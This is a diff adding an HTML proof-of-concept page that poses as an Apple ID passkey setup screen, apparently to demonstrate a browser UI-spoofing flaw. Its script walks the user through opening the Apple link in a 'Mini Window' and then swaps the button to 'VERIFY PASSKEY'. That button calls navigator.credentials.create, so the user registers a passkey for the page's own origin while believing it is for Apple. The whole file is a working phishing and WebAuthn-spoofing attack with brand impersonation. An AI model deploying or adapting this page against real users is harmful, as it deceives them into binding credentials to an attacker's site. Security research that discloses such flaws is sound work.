@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Apple ID - Passkey Setup</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f5f7;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            background: white;
+            width: 320px;
+            padding: 40px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+        .logo { width: 44px; margin-bottom: 24px; }
+        h1 { font-size: 24px; font-weight: 600; color: #1d1d1f; margin-bottom: 12px; }
+        p { color: #515154; font-size: 14px; line-height: 1.5; margin-bottom: 32px; }
+        .btn {
+            background-color: #0071e3;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+        }
+        #result {
+            margin-top: 30px;
+            padding: 15px;
+            background: #fff8e1;
+            border-radius: 8px;
+            display: none;
+            font-size: 13px;
+            color: #5d4037;
+            text-align: left;
+            border-left: 3px solid #ffca28;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" class="logo">
+    <h1>Register Passkey</h1>
+    <p id="step-1">1. Right-click the button below and select <b>"Open in Mini Window"</b>.</p>
+    <p id="step-2" style="display:none; color: #0071e3; font-weight: bold;">2. Now, click "VERIFY PASSKEY" to finalize the registration.</p>
+    
+    <a id="auth-trigger" class="btn" href="https://appleid.apple.com">
+        Start Registration
+    </a>
+
+    <div id="result"></div>
+</div>
+
+<script>
+    const trigger = document.getElementById('auth-trigger');
+    const step1 = document.getElementById('step-1');
+    const step2 = document.getElementById('step-2');
+    const result = document.getElementById('result');
+
+    let stage = 1;
+
+    async function triggerWebAuthn() {
+        try {
+            const publicKeyCredentialCreationOptions = {
+                challenge: new Uint8Array([1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4, 1, 2, 3, 4]), 
+                rp: {
+                    name: "Secure System Validation",
+                    id: window.location.hostname || "localhost" // Fallback to localhost if file:// is used, though it will still fail if not served via http.
+                },
+                user: {
+                    id: new Uint8Array([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16]),
+                    name: "user@example.com",
+                    displayName: "User Account"
+                },
+                pubKeyCredParams: [{alg: -7, type: "public-key"}],
+                authenticatorSelection: {
+                    authenticatorAttachment: "cross-platform",
+                    userVerification: "preferred"
+                },
+                timeout: 60000,
+                attestation: "none"
+            };
+
+            console.log("[PoC] Invoking navigator.credentials.create()...");
+            
+            const credential = await navigator.credentials.create({
+                publicKey: publicKeyCredentialCreationOptions
+            });
+
+            if (credential) {
+                result.style.display = 'block';
+                result.innerHTML = `
+                    <b>🛑 WEBAUTHN SPOOF SUCCESSFUL</b><br><br>
+                    The user completed the Passkey registration thinking it was for the site in the Mini Window.<br><br>
+                    <b>Credential ID:</b> ${credential.id.substring(0, 15)}...
+                `;
+                console.log("[PoC] Credential created:", credential);
+            }
+
+        } catch (err) {
+            console.error("[PoC] WebAuthn request failed:", err);
+            alert("WebAuthn API Failed:\n" + err.name + ": " + err.message + "\n\n1. Ensure you are running this on http://localhost:8000 (NOT file://).\n2. Do NOT use setTimeout.");
+        }
+    }
+
+    trigger.addEventListener('contextmenu', () => {
+        if (stage === 1) {
+            console.log("[PoC] Stage 1: Mini Window opening...");
+            setTimeout(() => {
+                stage = 2;
+                step1.style.display = 'none';
+                step2.style.display = 'block';
+                trigger.innerText = "VERIFY PASSKEY";
+                trigger.style.backgroundColor = "#34a853"; 
+                // Remove href so a regular click doesn't navigate away
+                trigger.removeAttribute("href");
+            }, 2000);
+        }
+    });
+
+    trigger.addEventListener('click', (e) => {
+        e.preventDefault();
+        if (stage === 2) {
+            triggerWebAuthn();
+        } else {
+            console.log("[PoC] Please right-click and open in Mini Window first.");
+        }
+    });
+
+</script>
+
+</body>
+</html>
